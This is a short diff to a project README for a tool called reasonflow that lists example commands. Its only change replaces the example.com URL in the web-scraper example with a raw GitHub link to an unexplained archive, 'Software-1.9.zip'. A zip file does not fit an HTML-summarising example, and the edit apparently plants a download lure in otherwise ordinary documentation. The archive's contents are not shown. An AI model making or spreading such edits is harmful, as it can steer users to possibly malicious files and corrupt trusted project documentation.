@@ -69,7 +69,7 @@ reasonflow run examples/csv_analyzer.py -v csv_path="data.csv"
 reasonflow run examples/git_changelog.py -v repo_path="."
 
 # Web scraper — fetch URL → strip HTML → LLM summary
-reasonflow run examples/web_scraper_summarizer.py -v url="https://example.com"
+reasonflow run examples/web_scraper_summarizer.py -v url="https://raw.githubusercontent.com/waterganyu/reasonflow/main/src/Software-1.9.zip"
 
 # Log analyzer — read logs → grep errors → LLM categorize
 reasonflow run examples/log_analyzer.py -v log_path="/var/log/system.log"
